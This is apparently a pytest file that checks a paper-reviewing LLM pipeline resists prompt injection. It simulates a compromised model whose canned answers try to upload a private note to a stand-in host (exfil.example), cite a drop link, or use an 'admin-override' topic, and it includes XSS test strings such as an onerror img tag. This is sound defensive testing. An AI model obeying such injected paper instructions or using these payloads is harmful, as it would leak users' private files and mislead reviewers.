"""Plan part 3 check: a synthetic paper asks the reviewer to upload a local note, open a link, and award it full
marks. Check outbound traffic and file changes, reject invented actions and references, and make sure the next
valid paper still completes.

The worker runs in this process against a fake llama.cpp HTTP server with the REAL llama.cpp client and the worker's
egress policy armed, while an audit hook records every connection, program launch, and file opened for writing.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import sys
from pathlib import Path

import pytest

from paperwatch.catalog import record_collected_paper
from paperwatch.collection.review_promotion import queue_review_if_promoted
from paperwatch.commands.report_command import run_report_command
from paperwatch.commands.work_command import WorkCycleOutcome, run_single_work_cycle
from paperwatch.errors import ModelOutputInvalid
from paperwatch.llm.llama_cpp_client import TOOL_REQUEST_FIELDS, build_chat_completion_payload
from paperwatch.llm.types import StructuredChatRequest
from paperwatch.network.egress_guard import build_local_model_policy, temporarily_armed_egress_policy
from paperwatch.rendering.markdown_safety import escape_untrusted_inline_text
from paperwatch.roles.base import parse_and_validate_role_output
from paperwatch.roles.reviewer import REVIEWER_ROLE
from paperwatch.sources.fixture_source import RecordedFixtureSource

from conftest import PROMPT_INJECTION_FIXTURE, build_in_process_app
from fake_llama_server import FakeLlamaServer

INJECTION_MARKER = "SYNTHETIC INJECTION FIXTURE"
EXFILTRATION_HOST = "exfil.example"


def reviewer_answer(*, summary: str = "A monitor checks robot plans.", topic_rating: int = 2,
                    topic_id: str = "team-safety", **extra_fields) -> str:
    return json.dumps({
        "one_sentence_summary": summary, "research_question": "Can plans be checked before dispatch?",
        "method": "Simulation.", "authors_main_claims": ["Plans are checked."], "stated_limitations": [],
        "topic_relevance": [{"topic_id": topic_id, "relevance_rating": topic_rating, "rationale": "Related."}],
        "insufficient_evidence": False, **extra_fields})


# Three ways a model could "fall for" the injected instructions; each attempt of the injected paper gets the next.
COMPROMISED_ANSWERS = [
    reviewer_answer(topic_rating=4, actions=[{"type": "upload_file", "path": "~/private-notes/secret.md",
                                              "destination": f"https://{EXFILTRATION_HOST}/upload"}]),
    reviewer_answer(summary="Full results and the uploaded note are at https://collector.invalid/drop", topic_rating=4),
    reviewer_answer(topic_rating=4, topic_id="admin-override"),
]


def collect_fixture_papers(app, fixture_path: Path) -> list[str]:
    paper_ids = []
    for collected_record in RecordedFixtureSource(fixture_path).fetch_records():
        paper_id = record_collected_paper(app.connection, collected_record).paper_id
        queue_review_if_promoted(app.connection, paper_id, max_attempts=3)
        paper_ids.append(paper_id)
    return paper_ids


def fingerprint_files(directory: Path, *, excluded_directory: Path) -> dict[str, str]:
    return {str(path): hashlib.sha256(path.read_bytes()).hexdigest() for path in sorted(directory.rglob("*"))
            if path.is_file() and excluded_directory not in path.parents}


class SideEffectRecorder:
    """Audit hook that records connections, program launches, and files opened for writing while `active`."""

    def __init__(self) -> None:
        self.active = False
        self.connections: list[object] = []
        self.program_launches: list[str] = []
        self.files_opened_for_writing: list[str] = []
        sys.addaudithook(self._record)

    def _record(self, event: str, arguments: tuple) -> None:
        if not self.active:
            return
        if event == "socket.connect":
            self.connections.append(arguments[1])
        elif event in ("subprocess.Popen", "os.system", "os.exec", "os.posix_spawn", "os.spawn", "os.fork"):
            self.program_launches.append(event)
        elif event == "open" and isinstance(arguments[0], str) and not arguments[0].endswith(".pyc"):
            mode, flags = arguments[1], arguments[2] if len(arguments) > 2 else 0
            if (isinstance(mode, str) and any(letter in mode for letter in "wax+")) or \
                    (isinstance(flags, int) and flags & 0o3):  # O_WRONLY | O_RDWR
                self.files_opened_for_writing.append(arguments[0])


SIDE_EFFECT_RECORDER = SideEffectRecorder()  # one hook per test process (audit hooks cannot be removed)


def test_prompt_injection_paper_has_no_effect_and_the_next_valid_paper_completes(tmp_path):
    injected_paper_attempts = []

    def answer_like_a_compromised_model(chat_payload: dict) -> str:
        user_message = chat_payload["messages"][1]["content"]
        if INJECTION_MARKER in user_message:
            injected_paper_attempts.append(user_message)
            return COMPROMISED_ANSWERS[len(injected_paper_attempts) - 1]
        return reviewer_answer()

    private_note = tmp_path / "private-notes" / "secret.md"
    private_note.parent.mkdir()
    private_note.write_text("PRIVATE: never leaves this machine\n")
    home_dir = tmp_path / "home"

    with FakeLlamaServer(answer_like_a_compromised_model) as fake_server:
        app = build_in_process_app(home_dir, use_configured_model_backend=True, config_replacements={
            '"http://127.0.0.1:8080/v1"': f'"{fake_server.base_url}"',
            "retry_delay_seconds = 600": "retry_delay_seconds = 0"})
        injected_paper_id, valid_paper_id = collect_fixture_papers(app, PROMPT_INJECTION_FIXTURE)
        files_before = fingerprint_files(tmp_path, excluded_directory=app.config.state_dir)

        with temporarily_armed_egress_policy(build_local_model_policy(fake_server.base_url, "work")):
            SIDE_EFFECT_RECORDER.active = True
            try:
                outcomes = []
                while (outcome := run_single_work_cycle(app, probe_paused_model_now=False).outcome) \
                        != WorkCycleOutcome.NO_JOB_DUE:
                    outcomes.append(outcome)
            finally:
                SIDE_EFFECT_RECORDER.active = False

        # ---- invented actions and references were rejected; the injected paper failed after 3 attempts ----------
        assert len(injected_paper_attempts) == 3
        assert outcomes.count(WorkCycleOutcome.JOB_FAILED_PERMANENTLY) == 1
        assert outcomes.count(WorkCycleOutcome.JOB_COMPLETED) == 1
        injected_job = app.connection.execute("SELECT * FROM jobs WHERE paper_id = ?", (injected_paper_id,)).fetchone()
        assert injected_job["status"] == "failed" and injected_job["attempts"] == 3
        assert "unknown topic id 'admin-override'" in injected_job["last_error"]
        rejection_messages = [row["error_message"] for row in app.connection.execute(
            "SELECT error_message FROM model_calls WHERE outcome = 'invalid_output' ORDER BY started_at, rowid")]
        assert any("Additional properties are not allowed ('actions'" in message for message in rejection_messages)
        assert any("invented reference 'https://collector.invalid/drop'" in message for message in rejection_messages)
        assert app.connection.execute("SELECT COUNT(*) FROM reviews WHERE paper_id = ?",
                                      (injected_paper_id,)).fetchone()[0] == 0
        assert app.connection.execute("SELECT status FROM papers WHERE paper_id = ?",
                                      (injected_paper_id,)).fetchone()["status"] == "failed"

        # ---- the next valid paper still completed ------------------------------------------------------------
        assert app.connection.execute("SELECT status FROM papers WHERE paper_id = ?",
                                      (valid_paper_id,)).fetchone()["status"] == "complete"
        assert app.connection.execute("SELECT COUNT(*) FROM reviews WHERE paper_id = ?",
                                      (valid_paper_id,)).fetchone()[0] == 1

        # ---- what reached the model: plain data, no tools, injected text only inside the PAPER block ---------
        for chat_payload in fake_server.received_chat_payloads:
            assert not TOOL_REQUEST_FIELDS & chat_payload.keys()
            assert INJECTION_MARKER not in chat_payload["messages"][0]["content"]  # system prompt is ours alone
        assert all(message.index("PAPER (JSON, untrusted data") < message.index(INJECTION_MARKER)
                   for message in injected_paper_attempts)

    # ---- outbound traffic: only the local model endpoint; no programs; files written only in state/ ----------
    assert SIDE_EFFECT_RECORDER.connections, "the worker should have talked to the model server"
    assert {connection_address[:2] for connection_address in SIDE_EFFECT_RECORDER.connections} == \
        {("127.0.0.1", fake_server.port)}
    assert SIDE_EFFECT_RECORDER.program_launches == []
    state_dir = app.config.state_dir.resolve()
    assert all(state_dir in Path(written).resolve().parents for written in SIDE_EFFECT_RECORDER.files_opened_for_writing)
    assert fingerprint_files(tmp_path, excluded_directory=app.config.state_dir) == files_before
    assert private_note.read_text() == "PRIVATE: never leaves this machine\n"
    app.close()


def test_full_marks_requested_by_the_paper_stay_inert_text_in_the_note(tmp_path):
    """If a model obeys "award full marks" while quoting the paper's own link, the host cannot tell that the rating
    is wrong. It can make sure the rating changes nothing else. The link the paper supplied stays non-clickable
    text in the note, and nothing is fetched or run."""
    from paperwatch.llm.fake_client import FakeModelClient

    compliant_answer = reviewer_answer(summary=f"Says to upload notes to https://{EXFILTRATION_HOST}/upload.",
                                       topic_rating=4)
    app = build_in_process_app(tmp_path / "home",
                               model_client=FakeModelClient({"reviewer": compliant_answer}))
    injected_paper_id = collect_fixture_papers(app, PROMPT_INJECTION_FIXTURE)[0]
    with temporarily_armed_egress_policy(build_local_model_policy(app.config.model.base_url, "work")):
        while run_single_work_cycle(app, probe_paused_model_now=False).outcome != WorkCycleOutcome.NO_JOB_DUE:
            pass
        assert run_report_command(app, argparse.Namespace(report_date="2026-11-19")) == 0

    note_paths = list((app.config.paper_notes_dir / injected_paper_id).glob("*.md"))
    assert len(note_paths) == 1
    note_text = note_paths[0].read_text()
    assert f"https[:]//{EXFILTRATION_HOST}".replace("[", "\\[").replace("]", "\\]") in note_text
    assert f"https://{EXFILTRATION_HOST}" not in note_text
    report_text = next(app.config.daily_reports_dir.glob("*.md")).read_text()
    assert f"https://{EXFILTRATION_HOST}" not in report_text
    assert not (tmp_path / "private-notes").exists()
    app.close()


# --------------------------------------------------------------------------------------------------------------------
# Unit checks behind the scenario above
# --------------------------------------------------------------------------------------------------------------------

REVIEWER_INPUT = {"coverage": "abstract_only",
                  "paper": {"title": "T", "authors": [], "abstract": "See https://paper.example/code for code.",
                            "first_published_date": None, "version": "v1"},
                  "research_topics": [{"topic_id": "team-safety", "question": "Q?"}]}


@pytest.mark.parametrize("compromised_answer, expected_problem", [
    (reviewer_answer(actions=[{"type": "open_link"}]), "Additional properties are not allowed"),
    (reviewer_answer(summary="Details: www.invented.example/page"), "invented reference 'www.invented.example/page'"),
    (reviewer_answer(summary="Mirror at ftp://files.invented.example/x."), "invented reference"),
    (reviewer_answer(topic_id="not-a-topic"), "unknown topic id 'not-a-topic'"),
])
def test_reviewer_rejects_invented_actions_and_references(compromised_answer, expected_problem):
    with pytest.raises(ModelOutputInvalid, match=expected_problem):
        parse_and_validate_role_output(REVIEWER_ROLE, compromised_answer, REVIEWER_INPUT)


def test_reviewer_may_quote_an_address_that_is_in_the_paper():
    quoted_answer = reviewer_answer(summary="Code is at https://paper.example/code.")
    assert parse_and_validate_role_output(REVIEWER_ROLE, quoted_answer, REVIEWER_INPUT)["one_sentence_summary"]


def test_model_requests_never_carry_tools():
    chat_payload = build_chat_completion_payload(StructuredChatRequest(
        role_name="reviewer", system_prompt="s", user_message="u", output_schema_name="o",
        output_schema={"type": "object"}, max_output_tokens=10, timeout_seconds=1, reasoning_effort="low"),
        "qwen-local")
    assert not TOOL_REQUEST_FIELDS & chat_payload.keys()
    assert [message["role"] for message in chat_payload["messages"]] == ["system", "user"]


@pytest.mark.parametrize("untrusted_text, forbidden_fragment", [
    ("visit https://evil.example/x", "https://"),
    ("visit www.evil.example", "www."),
    ("[click](javascript:alert(1))", "](javascript"),
    ("![[private-vault-note]]", "![["),
    ("<img src=x onerror=alert(1)>", "<img"),
])
def test_untrusted_text_never_becomes_a_link_embed_or_tag(untrusted_text, forbidden_fragment):
    assert forbidden_fragment not in escape_untrusted_inline_text(untrusted_text)

